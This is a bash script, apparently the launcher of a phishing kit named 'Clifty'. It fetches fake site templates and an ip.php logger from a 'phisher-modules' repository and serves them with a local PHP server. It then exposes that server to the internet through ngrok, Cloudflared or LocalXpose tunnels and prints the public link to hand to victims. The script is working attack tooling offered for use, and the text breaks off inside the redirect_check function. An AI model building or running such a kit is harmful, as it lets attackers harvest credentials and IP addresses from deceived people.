##COLOUR TEXT
BLACK="\e[30m"
RED="\e[31m"
GREEN="\e[32m"
YELLOW="\e[33m"
BLUE="\e[34m"
MAGENTA="\e[35m"
CYAN="\e[36m"
LGRAY="\e[37m"
GRAY="\e[90m"
LRED="\e[91m"
LGREEN="\e[92m"
LYELLOW="\e[93m"
LBLUE="\e[94m"
LMAGENTA="\e[95m"
LCYAN="\e[96m"
WHITE="\e[97m"
NC="\e[0m" #Reset colour

##COLOUR BG
BLACKBG="\e[40m"
REDBG="\e[41m"
GREENBG="\e[42m"
YELLOWBG="\e[43m"
BLUEBG="\e[44m"
MAGENTABG="\e[45m"
CYANBG="\e[46m"
LGRAYBG="\e[47m"
GRAYBG="\e[100m"
LREDBG="\e[101m"
LGREENBG="\e[102m"
LYELLOWBG="\e[103m"
LBLUEBG="\e[104m"
LMAGENTABG="\e[105m"
LCYANBG="\e[106m"
WHITEBG="\e[107m"
RESETBG="\e[0m\n" #Reset background

## COLOUR FONT - BOLD
BOLDBLACK="\e[1;30m"
BOLDRED="\e[1;31m"
BOLDGREEN="\e[1;32m"
BOLDYELLOW="\e[1;33m"
BOLDBLUE="\e[1;34m"
BOLDMAGENTA="\e[1;35m"
BOLDCYAN="\e[1;36m"
BOLDLGRAY="\e[1;37m"
BOLDGRAY="\e[1;90m"
BOLDLRED="\e[1;91m"
BOLDLGREEN="\e[1;92m"
BOLDLYELLOW="\e[1;93m"
BOLDLBLUE="\e[1;94m"
BOLDLMAGENTA="\e[1;95m"
BOLDLCYAN="\e[1;96m"
BOLDWHITE="\e[1;97m"
## COLOUR FONT - FAINT
FAINTBLACK="\e[2;30m"
FAINTRED="\e[2;31m"
FAINTGREEN="\e[2;32m"
FAINTYELLOW="\e[2;33m"
FAINTBLUE="\e[2;34m"
FAINTMAGENTA="\e[2;35m"
FAINTCYAN="\e[2;36m"
FAINTLGRAY="\e[2;37m"
FAINTGRAY="\e[2;90m"
FAINTLRED="\e[2;91m"
FAINTLGREEN="\e[2;92m"
FAINTLYELLOW="\e[2;93m"
FAINTLBLUE="\e[2;94m"
FAINTLMAGENTA="\e[2;95m"
FAINTLCYAN="\e[2;96m"
FAINTWHITE="\e[2;97m"
## COLOUR FONT - ITALIC
ITALICBLACK="\e[3;30m"
ITALICRED="\e[3;31m"
ITALICGREEN="\e[3;32m"
ITALICYELLOW="\e[3;33m"
ITALICBLUE="\e[3;34m"
ITALICMAGENTA="\e[3;35m"
ITALICCYAN="\e[3;36m"
ITALICLGRAY="\e[3;37m"
ITALICGRAY="\e[3;90m"
ITALICLRED="\e[3;91m"
ITALICLGREEN="\e[3;92m"
ITALICLYELLOW="\e[3;93m"
ITALICLBLUE="\e[3;94m"
ITALICLMAGENTA="\e[3;95m"
ITALICLCYAN="\e[3;96m"
ITALICWHITE="\e[3;97m"
## COLOUR FONT - UNDERLINE
ULBLACK="\e[4;30m"
ULRED="\e[4;31m"
ULGREEN="\e[4;32m"
ULYELLOW="\e[4;33m"
ULBLUE="\e[4;34m"
ULMAGENTA="\e[4;35m"
ULCYAN="\e[4;36m"
ULLGRAY="\e[4;37m"
ULGRAY="\e[4;90m"
ULLRED="\e[4;91m"
ULLGREEN="\e[4;92m"
ULLYELLOW="\e[4;93m"
ULLBLUE="\e[4;94m"
ULLMAGENTA="\e[4;95m"
ULLCYAN="\e[4;96m"
ULWHITE="\e[4;97m"
##RESET ALL FONT AND COLOUR
NF="\e[0;0m" 
NA="${NC}${NF}"


##IMPORTANT VARIABLES
#Directories---
pro_dir=$(pwd) #project directory
server_dir="${pro_dir}/.server" #server directory
www_dir="${pro_dir}/.server/www" #www directory
assets_dir="${pro_dir}/assets" #assets directory
dgf_dir="${pro_dir}/assets/dgf" #dgf directory
dumps_dir="${pro_dir}/assets/dumps" #dgf directory
update_dir="${pro_dir}/assets/update" #update dir
sites_dir="${pro_dir}/.sites" #sites directory
logs_dir="${pro_dir}/logs" #logs directory

#Date---
log_name=$(date +%d-%m-%Y-%H-%M-%S)
date_date=$(date +%d)
date_month=$(date +%m)
date_year=$(date +%Y)
date_hour=$(date +%H)
date_minute=$(date +%M)
date_second=$(date +%S)
date_nanosec=$(date +%n)
#prompt---
selected="Clifty"

#Normal Banner
banner(){
        echo -e " "
        echo -e "${MAGENTA}-----------------------------------------------------------${NC} "
	echo -e "${MAGENTA}|       ${BLUE} ██████╗██╗     ██╗███████╗████████╗██╗   ██╗     ${MAGENTA}|${NC}"
	echo -e "${MAGENTA}|       ${BLUE}██╔════╝██║     ██║██╔════╝╚══██╔══╝╚██╗ ██╔╝     ${MAGENTA}|${NC}"
	echo -e "${MAGENTA}|       ${BLUE}██║     ██║     ██║█████╗     ██║    ╚████╔╝      ${MAGENTA}|${NC}"
	echo -e "${MAGENTA}|       ${BLUE}██║     ██║     ██║██╔══╝     ██║     ╚██╔╝       ${MAGENTA}|${NC}"
	echo -e "${MAGENTA}|       ${BLUE}╚██████╗███████╗██║██║        ██║      ██║        ${MAGENTA}|${NC}"
	echo -e "${MAGENTA}|       ${BLUE} ╚═════╝╚══════╝╚═╝╚═╝        ╚═╝      ╚═╝        ${MAGENTA}|${NC}"
	echo -e "${MAGENTA}-----------------------------------------------------------${NC}"
        echo -e ""
}
# Credits banner
cbanner(){
        echo -e " "
        echo -e "${MAGENTA}-----------------------------------------------------------${NC} "
	echo -e "${MAGENTA}|       ${BLUE} ██████╗██╗     ██╗███████╗████████╗██╗   ██╗     ${MAGENTA}|${NC}"
	echo -e "${MAGENTA}|       ${BLUE}██╔════╝██║     ██║██╔════╝╚══██╔══╝╚██╗ ██╔╝     ${MAGENTA}|${NC}"
	echo -e "${MAGENTA}|       ${BLUE}██║     ██║     ██║█████╗     ██║    ╚████╔╝      ${MAGENTA}|${NC}"
	echo -e "${MAGENTA}|       ${BLUE}██║     ██║     ██║██╔══╝     ██║     ╚██╔╝       ${MAGENTA}|${NC}"
	echo -e "${MAGENTA}|       ${BLUE}╚██████╗███████╗██║██║        ██║      ██║        ${MAGENTA}|${NC}"
	echo -e "${MAGENTA}|       ${BLUE} ╚═════╝╚══════╝╚═╝╚═╝        ╚═╝      ╚═╝        ${MAGENTA}|${NC}"
	echo -e "${MAGENTA}-----------------------------------------------------------${NC}"
	echo -e "${BOLDBLUE}           ᴠᴇʀsɪᴏɴ 1.4               ＢＹ －ＡＬＹＧＮＴ           ${NC}"
        echo -e ""
}
#Small Banner
sbanner(){
	echo -e " "
	echo -e "${BLUE} ░█▀▀░█░░░▀█▀░█▀▀░▀█▀░█░█ ${NC}"
	echo -e "${BLUE} ░█░░░█░░░░█░░█▀▀░░█░░░█░ ${NC}"
	echo -e "${BLUE} ░▀▀▀░▀▀▀░▀▀▀░▀░░░░▀░░░▀░ ${NC}"
	echo -e "${NC} "
}

## Update Prompt
uprompt(){
        prompt="$(echo -e "${GREEN}>> ${ULYELLOW}${selected}${NF} >>${NA} ${BLUE}")"
}

## Directories
directories(){
if [[ ! -d "${server_dir}" ]]; then
        mkdir -p "${server_dir}"
fi
if [[ ! -d "${logs_dir}" ]]; then
        mkdir -p "${logs_dir}"
fi
if [[ -d "${www_dir}" ]]; then
        rm -rf "${www_dir}"
        mkdir -p "${www_dir}"
else
        mkdir -p "${www_dir}"
fi
if [[ -e ".cld.log" ]]; then
        rm -rf ".cld.log"
fi
if [  ! -e "${assets_dir}/ip.php" ]; then
        wget --no-check-certificate https://raw.githubusercontent.com/Alygnt/phisher-modules/sites/ip.php
	mv ip.php ${assets_dir}
fi
if [ ! -e "${assets_dir}/index.php" ]; then
	wget --no-check-certificate https://raw.githubusercontent.com/Alygnt/phisher-modules/sites/index.php
	mv index.php ${assets_dir}
fi
if [ !  -x "${dgf_dir}/dgf.sh" ];then
	chmod 777 "${dgf_dir}/dgf.sh"
fi
}

#Dependencies
dependencies() {
        echo -e "\n${BLUE}[${WHITE}+${BLUE}]${GREEN} Installing required packages..."
    if [[ -d "/data/data/com.termux/files/home" ]]; then
        if [[ `command -v proot` ]]; then
            printf ''
        else
                        echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package : ${YELLOW}proot${CYAN}${NC}"
            pkg install proot resolv-conf -y
        fi
    fi

        if [[ `command -v php` && `command -v wget` && `command -v curl` && `command -v unzip` ]]; then
                echo -e "\n${GREEN}[${WHITE}#${GREEN}]${GREEN} Packages already installed."
        else
                pkgs=(php curl wget unzip)
                for pkg in "${pkgs[@]}"; do
                        type -p "$pkg" &>/dev/null || {
                                echo -e "\n${GREEN}[${WHITE}#${GREEN}]${CYAN} Installing package : ${YELLOW}$pkg${CYAN}${NC}"
                                if [[ `command -v pkg` ]]; then
                                        pkg install "$pkg" -y
                                elif [[ `command -v apt` ]]; then
                                        apt install "$pkg" -y
                                elif [[ `command -v apt-get` ]]; then
                                        apt-get install "$pkg" -y
                                elif [[ `command -v pacman` ]]; then
                                        sudo pacman -S "$pkg" --noconfirm
                                elif [[ `command -v dnf` ]]; then
                                        sudo dnf -y install "$pkg"
                                else
                                        echo -e "\n${RED}[${WHITE}!${RED}]${RED} Unsupported package manager, Install packages manually."
                                        { reset_color; exit 1; }
                                fi
                        }
                done
        fi

}

## Reset terminal colors
reset_color() {
        tput sgr0   # reset attributes
        tput op     # reset color

    return
}

## Exit message
msg_exit() {
        { clear; banner; echo; }
        echo -e "${GREENBG}${BLACK} Thank you for using this tool. Have a good day.${RESETBG}\n"
        { reset_color; exit 0; }
}

## Kill already running process
kill_pid() {
        if [[ `pidof php` ]]; then
                killall php > /dev/null 2>&1
        fi
        if [[ `pidof ngrok` ]]; then
                killall ngrok > /dev/null 2>&1
        fi
        if [[ `pidof cloudflared` ]]; then
                killall cloudflared > /dev/null 2>&1
        fi
}

#check whether execute permission is granted
xpermission(){
	if [[ -x "clifty.sh" ]];then
		echo -e "\n${GREEN}[${WHITE}#${GREEN}]${GREEN} Execute Permission Granted!!"
	else
	        chmod 777 clifty.sh
	        echo -e "\n${GREEN}[${WHITE}#${GREEN}]${GREEN} Execute Permission Granted!!"
	fi
}

#check for updates
check_net_update(){
	check_netstats
	if [ $plainnetstats == "online" ]; then
                { clear; banner; }
		check_update
	else
		echo -e "\n${GREEN}[${WHITE}!${GREEN}]${RED}Your offline, Check your internet and try again."
		sleep 5
		mainmenu
	fi
}
check_update() {
	rm -rf version.txt
	rm -rf ${update_dir}/tmp
	mkdir ${update_dir}/tmp

	wget --no-check-certificate https://raw.githubusercontent.com/Alygnt/Clifty/main/assets/update/version.txt > /dev/null 2>&1
	mv version.txt ${update_dir}/tmp

	current_ver=$( cat ${update_dir}/version.txt )
	lat_ver=$( cat ${update_dir}/tmp/version.txt )
	if [ -z $lat_ver ]; then
                echo -e "\n${GREEN}[${WHITE}!${GREEN}]${RED}Error occured try again later!!."
		sleep 5
		mainmenu
        else
                if [ $current_ver == $lat_ver ]; then
		        echo -e "\n${GREEN}[${WHITE}#${GREEN}]${GREEN} Your up to date!! ${NC} "
		        { sleep 3; clear; mainmenu; }
	        else
        		echo -e " "
                        echo -e "${ULWHITE}${BOLDWHITE}UPDATE FOUND!! ${NF} : ${NA}"
                        echo -e " "
		        echo -e "${GREEN} Current version = ${YELLOW} $current_ver "
		        echo -e "${GREEN} Latest version = ${YELLOW} $lat_ver "
                        echo -e " "
                        echo -e "${GREEN}[${WHITE}?${GREEN}]${GREEN} Do you want to update it? ${NF}"
                        echo -e "${BLUE}[1/Y]  ${CYAN} YES ${NC}"
                        echo -e "${BLUE}[2/N/*]${CYAN} NO ${NC}"
                        echo -e " "
                        temprompt="$(echo -e "${YELLOW}>> ${BLUE}")"
	                read -p "${temprompt}" ureply
		        case $ureply in
        			Y | y)
        				update;;
			        N | n | *)
				        { clear;  mainmenu; };;
		        esac
	        fi
        fi
}

update() {
	echo -e "\n${GREEN}[${WHITE}#${GREEN}]${GREEN} UPDATING ${NC}"
	mkdir $HOME/clifty
	if [ -e ${server_dir}/ngrok ]; then
		mv ${server_dir}/ngrok $HOME/clifty
	fi
	if [ -e ${server_dir}/cloudflared ]; then
        	mv ${server_dir}/cloudflared $HOME/clifty
	fi

	cd ..
	rm -rf Clifty
	echo -e "\n${GREEN}[${WHITE}#${GREEN}]${GREEN} REINSTALLING THE TOOL ${NC} "
	git clone https://github.com/Alygnt/Clifty

	if [ -d Clifty ]; then
		cd Clifty
	        mv $HOME/clifty/ngrok ${server_dir}
	        mv $HOME/clifty/cloudflared ${server_dir}
	        rm -rf $HOME/clifty
	        credits_banner
		echo -e " "
		echo -e "\n${GREEN}[${WHITE}#${GREEN}]${GREEN} SUCCESSFULLY UPDATED!! ( Version: ${lat_ver} ) ${NC} "
	        sleep 0.3
		echo -e "\n${GREEN}[${WHITE}#${GREEN}]${GREEN} Now running the tool!! ${NC} "
	        sleep 2
	        bash clifty.sh
		echo  " "
	else
		echo -e "\n${GREEN}[${WHITE}!${GREEN}]${RED} SORRY, ERROR OCCURED!! TRY REINSTALLING MANUALLY!! ${NC} "
	fi

}

load_anim() {
    spinner=( '-' '\' '|' '/' )
    while [ l ]
    do
        for i in "${spinner[@]}"
        do
            echo -ne "\r${GREEN}[${WHITE}-${GREEN}]${GREEN}$1 ${BLUE}[${MAGENTA}$i${BLUE}]${NC}"
            sleep 0.2
        done
    done
}
load_print() {
        load_anim "${1}" &
        p=$!
        for i in 'seq l 10'
        do
                sleep $2
        done
        kill $p
}

## Install ngrok
check_ngrok(){
        { clear; banner; echo -e ""; }
	if [ ! -e "${server_dir}/ngrok" ]; then
		echo -e " "
                echo -e "${GREEN}[${WHITE}!${GREEN}]${GREEN} NGROK NOT INSTALLED!!${BLUE}"
                echo -e "${GREEN}[${WHITE}?${GREEN}]${ULWHITE}${BOLDWHITE} Do you want to install now? ${NF} : ${NC}"
                echo -e " " 
                echo -e "${BLUE}[1/Y]  ${CYAN} YES ${NC}"
                echo -e "${BLUE}[2/N/*]${CYAN} NO ${NC}"
                echo -e "${NC}"
                temprompt="$(echo -e "${YELLOW}>> ${BLUE}")"
	        read -p "${temprompt}"
		case $REPLY in
		Y | y)
			install_ngrok
			ngrok_token_check;;

		N | n | *)
			tunnelmenu;;

		esac
	else
		ngrok_token_check
	fi
}
install_ngrok() {
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing ngrok...${NC}"
		arch=`uname -m`
		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
			download 'https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm.tgz' 'ngrok'
		elif [[ "$arch" == *'aarch64'* ]]; then
			download 'https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm64.tgz' 'ngrok'
		elif [[ "$arch" == *'x86_64'* ]]; then
			download 'https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz' 'ngrok'
		else
			download 'https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-386.tgz' 'ngrok'
		fi
}
##Ngrok token auth
ngrok_token_check(){
        if [ -s "${HOME}/.ngrok2/ngrok.yml" ]; then
                echo -e "\n${GREEN}[${WHITE}#${GREEN}]${GREEN} Ngrok Authtoken setup is already done."
		start_ngrok
        else
                echo -e "\n${GREEN}[${WHITE}#${GREEN}]${BLUE} Setting up authtoken"
                ngrok_token_setup
        fi
}
ngrok_token_setup(){
        if [[ -d "${HOME}/.ngrok2/" ]]; then
		echo -e "\n${GREEN}[${WHITE}#${GREEN}]${GREEN} Ngrok2 directory exists!!"
        else
		mkdir $HOME/.ngrok2
		echo -ne "\n${RED}[${WHITE}-${RED}]${GREEN} Created Ngrok2 directory "
		echo -e " "
        fi

	rm -rf ${HOME}/.ngrok2/ngrok.yml
        temprompt="$(echo -e "${GREEN}[${WHITE}?${GREEN}]${ULWHITE}${BOLDWHITE} ENTER YOUR AUTHTOKEN${NA}${YELLOW} >> ${NA}")"
	read -p "${temprompt}" ntoken
	echo -e "authtoken : ${ntoken}" >> ngrok.yml
	mv ngrok.yml ${HOME}/.ngrok2/
	./.server/ngrok config upgrade
	echo -ne "\n${RED}[${WHITE}-${RED}]${GREEN} Upgraded ngrok configurations"
	clear
	banner
	start_ngrok
}
ngrok_region() {
        echo -e ""
        echo -e "${ULWHITE}${BOLDWHITE}ENTER YOUR PREFERED REGION${NA}${YELLOW} >> ${NA}"
        temprompt="$(echo -e " ${GREEN}(Example: us eu au ap sa jp in) ${NA}${YELLOW}>> ")"
	read -p "${temprompt}" ngrokregion
	case $ngrokregion in
	"us" | "US")
		ngrokregion="us";;
	"eu" | "EU")
		ngrokregion="eu";;
	"au" | "AU")
		ngrokregion="au";;
	"ap" | "AP")
		ngrokregion="ap";;
	"sa" | "SA")
		ngrokregion="sa";;
	"jp" | "JP")
		ngrokregion="jp";;
	"in" | "IN")
		ngrokregion="in";;
	*)
		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Tryagain"
		{ sleep 5; clear; banner; echo -e ""; ngrok_region; };;
	esac
}
## Start ngrok
start_ngrok() {
        setup_site_check
	echo -e "\n"
	ngrokregion="us"
        temprompt="$(echo -e "${GREEN}[${WHITE}?${GREEN}]${ULWHITE}${BOLDWHITE}CHANGE NGROK SERVER REGION (Y/n) ${NA}${YELLOW}>> ${NA}")"
	read -p "${temprompt}"
	case $REPLY in
	1 | Y | y | yes | Yes | YES)
		ngrok_region;;
	*)
		echo -e " ";;
	esac
        #load_print "Launching NGROK" '15'
        echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Ngrok..."
        if [[ `command -v termux-chroot` ]]; then
                sleep 2 && termux-chroot ./.server/ngrok http --region ${ngrokregion} "$HOST":"$PORT"> /dev/null 2>&1 &
        else
                sleep 2 && ./.server/ngrok http --region ${ngrokregion} "$HOST":"$PORT"> /dev/null 2>&1 &
        fi
	sleep 15
	fetchlink_ngrok
	checklink
}
fetchlink_ngrok() {
	ngrok_url=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -Eo '(https)://[^/"]+(.ngrok.io)')
        LINK="$ngrok_url"
}

## Install Cloudflared
check_cloudflared(){
        { clear; banner; echo -e ""; }
	if [ ! -e "${server_dir}/cloudflared" ]; then
		echo -e " "
                echo -e "${GREEN}[${WHITE}!${GREEN}]${GREEN} CLOUDFLARED NOT INSTALLED!!${BLUE}"
                echo -e "${GREEN}[${WHITE}?${GREEN}]${ULWHITE}${BOLDWHITE} Do you want to install now? ${NF} : ${NC}"
                echo -e " " 
                echo -e "${BLUE}[1/Y]  ${CYAN} YES ${NC}"
                echo -e "${BLUE}[2/N/*]${CYAN} NO ${NC}"
                echo -e "${NC}"
		temprompt="$(echo -e "${YELLOW}>> ${BLUE}")"
                read -p "${temprompt}"
		case $REPLY in
		Y | y)
			install_cloudflared
			start_cloudflared;;
		N | n | *)
			tunnelmenu;;
		esac
	else
                start_cloudflared
	fi
}
install_cloudflared() {
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing Cloudflared...${NC}"
		arch=`uname -m`
		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm' 'cloudflared'
		elif [[ "$arch" == *'aarch64'* ]]; then
			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64' 'cloudflared'
		elif [[ "$arch" == *'x86_64'* ]]; then
			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64' 'cloudflared'
		else
			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386' 'cloudflared'
		fi
}
## Start Cloudflared
start_cloudflared() {
        setup_site_check
	rm ${server_dir}/.cld.log > /dev/null 2>&1 &
        rm .cld.log > /dev/null 2>&1 &
        echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Cloudflared..."

        if [[ `command -v termux-chroot` ]]; then
                sleep 2 && termux-chroot ${server_dir}/cloudflared tunnel -url "$HOST":"$PORT" --logfile .cld.log > /dev/null 2>&1 &
        else
                sleep 2 && ${server_dir}/cloudflared tunnel -url "$HOST":"$PORT" --logfile .cld.log > /dev/null 2>&1 &
        fi
	sleep 15
	fetchlink_cloudflared
	checklink
}
fetchlink_cloudflared() {
	cldflr_url=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' "${server_dir}/.cld.log")
        LINK="${cldflr_url}"
}

## Install LocalXpose
check_localxpose(){
	if [ ! -e "${server_dir}/loclx" ]; then
		echo -e " "
                echo -e "${GREEN}[${WHITE}!${GREEN}]${GREEN} LOCALXPOSE NOT INSTALLED!!${BLUE}"
                echo -e "${GREEN}[${WHITE}?${GREEN}]${ULWHITE}${BOLDWHITE} Do you want to install now? ${NF} : ${NC}"
                echo -e " " 
                echo -e "${BLUE}[1/Y]  ${CYAN} YES ${NC}"
                echo -e "${BLUE}[2/N/*]${CYAN} NO ${NC}"
                echo -e "${NC}"
		temprompt="$(echo -e "${YELLOW}>> ${BLUE}")"
                read -p "${temprompt}"
		case $REPLY in
		Y | y)
			install_localxpose
			token_localxpose
			start_loclx;;

		N | n | *)
			tunnelmenu;;

		esac
	else
		start_loclx
	fi
}
install_localxpose() {
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing LocalXpose...${NC}"
		arch=`uname -m`
		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-arm.zip' 'loclx'
		elif [[ "$arch" == *'aarch64'* ]]; then
			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-arm64.zip' 'loclx'
		elif [[ "$arch" == *'x86_64'* ]]; then
			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-amd64.zip' 'loclx'
		else
			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-386.zip' 'loclx'
		fi
}
token_localxpose() {
	./.server/loclx -help > /dev/null 2>&1 &
	sleep 1
	[ -d ".localxpose" ] && auth_f=".localxpose/.access" || auth_f="$HOME/.localxpose/.access"

	[ "$(./.server/loclx account status | grep Error)" ] && {
		echo -e "\n\n${RED}[${WHITE}!${RED}]${GREEN} Create an account on ${YELLOW}localxpose.io${GREEN} & copy the token\n"
		sleep 3
                temprompt="$(echo -e "${GREEN}[${WHITE}?${GREEN}]${ULWHITE}${BOLDWHITE} ENTER YOUR AUTHTOKEN${NA}${YELLOW} >> ${NA}")"
	        read -p "${temprompt}" loclx_token
		[[ $loclx_token == "" ]] && {
			echo -e "\n${RED}[${WHITE}!${RED}]${RED} You have to input Localxpose Token." ; sleep 2 ; tunnelmenu
		} || {
			echo -n "$loclx_token" > $auth_f 2> /dev/null
		}
	}
}
## Start LocalXpose
start_loclx() {
	{ clear; banner; echo -e ""; }
        setup_site_check
	echo -e "\n"
        temprompt="$(echo -e "${GREEN}[${WHITE}?${GREEN}]${ULWHITE}${BOLDWHITE} CHANGE NGROK SERVER REGION (Y/eu/us/N)${NA}${YELLOW}>> ${NA}")"
	read -n1 -p "${temprompt}" opinion
	[[ ${opinion,,} == "y" ]] && loclx_region="eu" || loclx_region="us"
	echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching LocalXpose..."

	if [[ `command -v termux-chroot` ]]; then
		sleep 1 && termux-chroot ./.server/loclx tunnel --raw-mode http --region ${loclx_region} --https-redirect -t "$HOST":"$PORT" > ${server_dir}/.loclx 2>&1 &
	else
		sleep 1 && ./${server_dir}/loclx tunnel --raw-mode http --region ${loclx_region} --https-redirect -t "$HOST":"$PORT" > ${server_dir}/.loclx 2>&1 &
	fi
	sleep 15
	fetchlink_localxpose
	checklink
}
fetchlink_localxpose() {
	loclx_url=$(cat ${server_dir}/.loclx | grep -o '[0-9a-zA-Z.]*.loclx.io')
        LINK="${loclx_url}"
}

# Download Binaries
download() {
	url="$1"
	output="$2"
	file=`basename $url`
	if [[ -e "$file" || -e "$output" ]]; then
		rm -rf "$file" "$output"
	fi
	curl --silent --insecure --fail --retry-connrefused \
		--retry 3 --retry-delay 2 --location --output "${file}" "${url}"

	if [[ -e "$file" ]]; then
		if [[ ${file#*.} == "zip" ]]; then
			unzip -qq $file > /dev/null 2>&1
			mv -f $output ${server_dir}/$output > /dev/null 2>&1
		elif [[ ${file#*.} == "tgz" ]]; then
			tar -zxf $file > /dev/null 2>&1
			mv -f $output ${server_dir}/$output > /dev/null 2>&1
		else
			mv -f $file ${server_dir}/$output > /dev/null 2>&1
		fi
		chmod +x ${server_dir}/$output > /dev/null 2>&1
		rm -rf "$file"
	else
		echo -e "\n${RED}[${WHITE}!${RED}]${RED} Error occured while downloading ${output}."
		{ reset_color; exit 1; }
	fi
}

## Start localhost
start_localhost() {
        echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST ${GREEN})"
        setup_site_check
        { sleep 1; clear; banner; }
        displaylocalhost
	capture_data_check
}

#Host and port setup
HOST='127.0.0.1'
cusport() {
        { clear; banner; }
        echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
        echo -e "\t\t${GREEN})) ${BLUE}Network Status  = $netstats${NA}"
        echo -e "\t\t${GREEN})) ${ULBLUE}SITE${NA}     : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
        echo -e "\t\t${GREEN})) ${ULBLUE}TEMPLATE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${sitype}${NA}"
        echo -e "\t\t${GREEN})) ${ULBLUE}TUNNELER${NA} : ${ULMAGENTA}${BOLDMAGENTA}${tutype}${NA}"
        echo -e ""
        echo -e ""
        PORT=4444
        echo -e "${RED}[${WHITE}?${RED}]${ULWHITE}${BOLDWHITE}DO YOU WANT TO SETUP CUSTOM PORT ${NA}${YELLOW} >> ${BLUE}"
        echo -e "   ${GREEN}Current port : ${BLUE}${PORT}${NA}"   
        echo -e ""
        echo -e "${BLUE}[1/Y]  ${CYAN} YES ${NC}"
        echo -e "${BLUE}[2/N/*]${CYAN} NO ${NC}"
        echo -e ""
        selected="Clifty/${siname}/${sitype}/${tutype}"
        uprompt;read -p "${prompt}"
	case $REPLY in
	1 | Y | y | yes | Yes | YES)
                echo -e ""
                echo -e ""
                temprompt="$(echo -e "${ULWHITE}${BOLDWHITE}TYPE YOUR CUSTOM PORT ${NA}${YELLOW}>> ${BLUE}")"
		read -p "${temprompt}" cport
		PORT="${cport}";;
	*)
		PORT="4444";;
	esac
}

## SETUP SITE
#checking the site is offline or not
setup_site_check() {
        { clear; banner; }
        echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
        echo -e "\t\t${GREEN})) ${BLUE}Network Status  = $netstats${NA}"
        echo -e "\t\t${GREEN})) ${ULBLUE}SITE${NA}     : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
        echo -e "\t\t${GREEN})) ${ULBLUE}TEMPLATE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${sitype}${NA}"
        echo -e "\t\t${GREEN})) ${ULBLUE}TUNNELER${NA} : ${ULMAGENTA}${BOLDMAGENTA}${tutype}${NA}"
        echo -e ""
        if [ -d ${sites_dir} ]; then
                if [ -d "${sites_dir}/${website}" ]; then
                        echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Site is already downloaded... NOW STARTING!! " 
                        setup_site_downloaded
                else 
                        echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Site is not downloaded... DOWNLOADING NOW!! "
                        setup_site_dgf
                fi
        else
                echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Site is not downloaded!! "
                setup_site_dgf
        fi
}
## Setup website - offline
setup_site_downloaded() {
        echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST ${GREEN})"
        sleep 1
        echo -e "\n${RED}[${WHITE}-${RED}]${ULBLUE} SETTING UP SERVER....${NA}"
        cp -rf ${sites_dir}/"$website"/* ${www_dir}
	cp ${assets_dir}/ip.php ${www_dir}
	cp ${assets_dir}/index.php ${www_dir}
        cusport
        redirect_check
        start_php
}
setup_site_dgf() {
	rm -rf $dgfname
        dgfurl="https://github.com/Alygnt/phisher-modules/tree/sites/$dgfname"
        check_netstats
	if [ $plainnetstats == "online" ]; then
                echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Downloading site..."${WHITE}
                bash ${dgf_dir}/dgf.sh ${dgfurl}
                if [ -d ${dgfname} ]; then
                        echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Site downloaded Successfully..." 
                        echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} SETTING UP" 
                        cp -rf ${website}/* ${www_dir}
                        cp ${assets_dir}/ip.php ${www_dir}
	                cp ${assets_dir}/index.php ${www_dir}
                        rm -rf ${dgfname}
                        cusport
                        redirect_check
                        start_php
                else 
                        echo -e "\n${RED}[${WHITE}-${RED}]${RED} Unable to download the site!! "
                        echo -e "\n${RED}[${WHITE}-${RED}]${RED} Try again later!!"
                        sleep 5
                        mainmenu
                fi
	else
		echo -e "\n${BLUE}[${RED}!${BLUE}]${BOLDRED} Your offline can't download the site!!${NA}"
		echo -e "\n${RED}[${WHITE}-${RED}]${RED} Try again later!!"
                sleep 5
                mainmenu
	fi
}
start_php() {
         { clear; banner; echo -e ""; }
        echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Starting PHP server...${NC}"
        cd ${www_dir} && php -S "$HOST":"$PORT" > /dev/null 2>&1 &
}

##REDIRECT
redirect_check(){
        { clear; banner; }
        echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
        echo -e "\t\t${GREEN})) ${BLUE}Network Status  = $netstats${NA}"
